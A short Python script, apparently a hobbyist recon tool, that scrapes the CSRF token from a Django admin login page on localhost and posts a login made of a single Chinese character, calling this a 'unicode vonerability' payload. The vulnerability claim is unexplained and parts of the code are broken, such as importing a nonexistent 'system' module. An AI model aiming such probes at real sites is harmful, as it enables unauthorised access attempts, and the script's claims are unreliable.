#
# Django Recon
#
# Henry Samuelson 11/29/18

# This is built to work assuming server is running on localhost

import requests
import system

def ui():
    #system('cls')
    print("DJango Recon")
    input1 = str(raw_input("Target Admin page url (str)> "))
    requestPage(input1)
    pass

def requestPage(url = 0):#url):

    client = requests.session() #Set Session for requests

    # first get csrf token by stealing csrf from body of return html
    r = client.get('http://localhost:8000/admin/login/?next=/admin/', auth=('user', 'pass'))
    r = r.text
    r = r[r.find('value'):] # search html for csrf value
    token = str(r[7:r.find('"', 7)]) # get csrf token


    # Payload with unicode vonerability
    payload = {'username': '漢', 'password': '漢' , "csrfmiddlewaretoken":token}
    r = client.post('http://localhost:8000/admin/login/?next=/admin/', data = payload)
    #r = r.json()
    print(r.text)
    return r.text

requestPage()
#ui()
